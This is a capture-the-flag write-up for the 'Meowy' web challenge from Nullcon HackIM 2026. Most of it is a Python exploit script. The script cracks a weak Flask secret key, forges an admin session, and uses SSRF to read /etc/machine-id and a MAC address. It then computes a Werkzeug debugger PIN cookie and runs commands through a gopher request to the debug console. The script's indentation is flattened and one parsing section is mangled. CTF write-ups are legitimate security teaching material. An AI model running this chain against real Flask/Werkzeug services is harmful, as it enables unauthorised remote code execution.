---
title: "Meowy - Nullcon Goa HackIM 2026 CTF"
category: "web"
subcategory: "ssrf"
type: "writeup"
tags: ["web", "ssrf", "flask", "werkzeug", "eval", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "Event: Nullcon Goa HackIM 2026 CTF"
source:
  name: "CTFtime writeup #40637"
  url: "https://ctftime.org/writeup/40637"
original_source: "https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/Meowy/README.md"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "Meowy"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** Meowy
- **Author team:** RootRunners
- **CTFtime tags:** web
- **CTFtime:** <https://ctftime.org/writeup/40637>
- **Original writeup:** <https://github.com/RootRunners/Nullcon-Goa-HackIM-2026-CTF-RootRunners-Official-Write-ups/blob/main/Web/Meowy/README.md>

---
# Meowy

**Event:** Nullcon Goa HackIM 2026 CTF   
**Category:** Web   
**Points:** 299   
**Service:** `52.59.124.14:5004` 

## Overview  
The app uses Flask sessions with a weak, dictionary-based `secret_key`. An admin-only `/fetch` endpoint allows SSRF and supports `file://` and `gopher://`. By cracking the Flask secret, we can forge an admin session, access the Werkzeug console on localhost, and execute `/readflag` via a trusted PIN cookie.

## Vulnerabilities  
\- Weak Flask `secret_key` generated from an English word list.  
\- Admin-only SSRF at `/fetch` supports `file://` and `gopher://`.  
\- Werkzeug console reachable on `127.0.0.1:5000/console`.  
\- PIN trust cookie can be computed from system identifiers.

## Solution  
1\. Get a session cookie from `/`.  
2\. Brute-force the Flask secret using a dictionary.  
3\. Forge `{"is_admin": true}` to access `/fetch`.  
4\. SSRF-read `/etc/machine-id` and `/sys/class/net/eth0/address`.  
5\. Request the console page and extract its `SECRET` token.  
6\. Recreate the Werkzeug PIN cookie and send a gopher request that executes `/readflag`.

## Requirements  
\- Python 3  
\- `flask` and `itsdangerous`  
\- A word list at `/usr/share/dict/words` (adjust `DICT` if different)

## Exploit Script  
```python  
#!/usr/bin/env python3  
import hashlib  
import html  
import time  
import urllib.parse  
import urllib.request

BASE = "http://52.59.124.14:5004"  
DICT = "/usr/share/dict/words"

def http_get(path, cookie=None):  
req = urllib.request.Request(BASE + path)  
if cookie:  
req.add_header("Cookie", cookie)  
with urllib.request.urlopen(req, timeout=10) as r:  
return r.read().decode("utf-8", "ignore"), dict(r.headers)

def http_post(path, data, cookie=None):  
body = urllib.parse.urlencode(data).encode()  
req = urllib.request.Request(BASE + path, data=body)  
if cookie:  
req.add_header("Cookie", cookie)  
with urllib.request.urlopen(req, timeout=10) as r:  
return r.read().decode("latin-1", "ignore"), dict(r.headers)

def extract_session_cookie(headers):  
sc = headers.get("Set-Cookie", "")  
for part in sc.split(";"):  
part = part.strip()  
if part.startswith("session="):  
return part.split("=", 1)[1]  
raise RuntimeError("session cookie not found")

def crack_flask_secret(cookie):  
from itsdangerous import URLSafeTimedSerializer  
from itsdangerous.exc import BadSignature  
from flask.json.tag import TaggedJSONSerializer

serializer = TaggedJSONSerializer()  
with open(DICT, "r", errors="ignore") as f:  
for line in f:  
key = line.strip()  
if len(key) < 12:  
continue  
s = URLSafeTimedSerializer(  
secret_key=key,  
salt="cookie-session",  
serializer=serializer,  
signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1},  
)  
try:  
s.loads(cookie)  
return key  
except BadSignature:  
pass  
raise RuntimeError("secret key not found")

def forge_admin_cookie(secret_key):  
from itsdangerous import URLSafeTimedSerializer  
from flask.json.tag import TaggedJSONSerializer

serializer = TaggedJSONSerializer()  
s = URLSafeTimedSerializer(  
secret_key=secret_key,  
salt="cookie-session",  
serializer=serializer,  
signer_kwargs={"key_derivation": "hmac", "digest_method": hashlib.sha1},  
)  
return s.dumps({"is_admin": True})

def fetch_ssrf(admin_cookie, url):  
body, _ = http_post("/fetch", {"url": url}, cookie=f"session={admin_cookie}")  
# extract 

```
     content  
        start = body.find("

```
    ")  
        end = body.find("
```

", start + 5)  
if start == -1 or end == -1:  
return ""  
return html.unescape(body[start + 5 : end]) 

def get_console_secret(admin_cookie):  
page = fetch_ssrf(admin_cookie, "http://127.0.0.1:5000/console")  
for line in page.splitlines():  
if "SECRET" in line:  
# SECRET = "....";  
return line.split('"')[1]  
raise RuntimeError("console secret not found")

def compute_pin_cookie(admin_cookie):  
# gather bits from SSRF  
machine_id = fetch_ssrf(admin_cookie, "file:///etc/machine-id").strip().encode()  
mac = fetch_ssrf(admin_cookie, "file:///sys/class/net/eth0/address").strip()  
node = int(mac.replace(":", ""), 16)

username = "ctfplayer"  
modname = "flask.app"  
appname = "Flask"  
modfile = "/usr/local/lib/python3.11/site-packages/flask/[app.py](http://app.py)"

def h_update(h, bit):  
if not bit:  
return  
if isinstance(bit, str):  
bit = bit.encode()  
h.update(bit)

h = hashlib.sha1()  
for bit in (username, modname, appname, modfile, str(node), machine_id):  
h_update(h, bit)  
h.update(b"cookiesalt")  
cookie_name = "__wzd" + h.hexdigest()[:20]

h.update(b"pinsalt")  
num = f"{int(h.hexdigest(), 16):09d}"[:9]  
pin = "-".join([num[:3], num[3:6], num[6:]])  
pin_hash = hashlib.sha1(f"{pin} added salt".encode("utf-8", "replace")).hexdigest()[:12]  
return cookie_name, pin, pin_hash

def gopher_eval(admin_cookie, secret, cookie_name, pin_hash, cmd):  
params = {  
"__debugger__": "yes",  
"cmd": cmd,  
"frm": "0",  
"s": secret,  
}  
query = urllib.parse.urlencode(params, safe="()'./")  
path = f"/console?{query}"  
ts = int(time.time())  
cookie = f"{cookie_name}={ts}|{pin_hash}"  
req = (  
f"GET {path} HTTP/1.1\r\n"  
"Host: 127.0.0.1:5000\r\n"  
f"Cookie: {cookie}\r\n"  
"\r\n"  
)  
gopher = "gopher://127.0.0.1:5000/_" + urllib.parse.quote(req)  
return fetch_ssrf(admin_cookie, gopher)

def main():  
_, headers = http_get("/")  
session_cookie = extract_session_cookie(headers)  
secret = crack_flask_secret(session_cookie)  
admin_cookie = forge_admin_cookie(secret)

console_secret = get_console_secret(admin_cookie)  
cookie_name, pin, pin_hash = compute_pin_cookie(admin_cookie)

output = gopher_eval(  
admin_cookie,  
console_secret,  
cookie_name,  
pin_hash,  
"__import__('os').popen('/readflag').read()",  
)

print("flask_secret:", secret)  
print("console_secret:", console_secret)  
print("pin:", pin)  
print("result:", output.strip())

if __name__ == "__main__":  
main()  
```

## Flag  
`ENO{w3rkz3ug_p1n_byp4ss_v1a_c00k13_f0rg3ry_l3ads_2_RCE!}`  
```
